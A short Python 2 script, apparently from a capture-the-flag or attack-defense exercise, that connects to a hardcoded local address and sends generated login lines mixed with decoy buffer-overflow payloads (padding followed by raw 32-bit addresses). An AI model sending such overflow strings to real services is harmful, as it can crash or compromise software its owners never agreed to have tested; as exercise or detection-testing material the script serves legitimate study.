#   -*- coding:utf-8  -*-
#!usr/bin/env python2

# from pwn import *

# REMOTE = "1.1.1.1"
#PORT = 1
 
import time
import random
import socket

# DEBUG = 1
# if DEBUG:
#     ph = remote("127.0.0.1", 9998)
# else:
#     ph = remote(REMOTE, PORT)


class remote(object):
    s = None
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.connect((host, port))
        except Exception as e:
            print("[!]port %d is close"%port)
            assert 1==3

    def sendline(self, string):
        self.s.send(string+"\n")
        return string

totalMinute = 60
username = ['HW','piggy','bertk','TKat','Robot','FAKing','Username','QwEaK','Test','Hakcking']
password = ['yu','cy','ke','king','ilove','xihuan','mima','ceshi']
def sendMsg(ph):
    
    nowTime = random.randint(0,20)
    while nowTime<totalMinute - 2:
        # first,send correct message interval(about 90%)
        # time.sleep(1)
        userIndex = ((nowTime)+31)%len(username)
        passIndex = ((nowTime&0xff)+2)%len(password)
        ph.sendline("%s\n%s%d"%(username[userIndex],password[passIndex], (((nowTime+34)<<3)%365)*127))
        if nowTime == 30 :
          # and we should mix fake attack info:(about 8%)
            num = random.randint(0,50)
            ph.sendline(num* 'a' + '\x0b\xa0\x04\x08')
        nowTime += 1

    # finally, give really fake to attack info:(about 2%)
    while nowTime<totalMinute:
        ph.sendline("a" *9 +"\x00" + "\x80"*(233 - 10)+'\x0a\x0a\x04\x08')
        nowTime += 1


def attacker(host, port = 9998):
    ph = remote(host, port)
    sendMsg(ph)
    return True


if __name__ == "__main__":
    attacker("192.168.140.128")
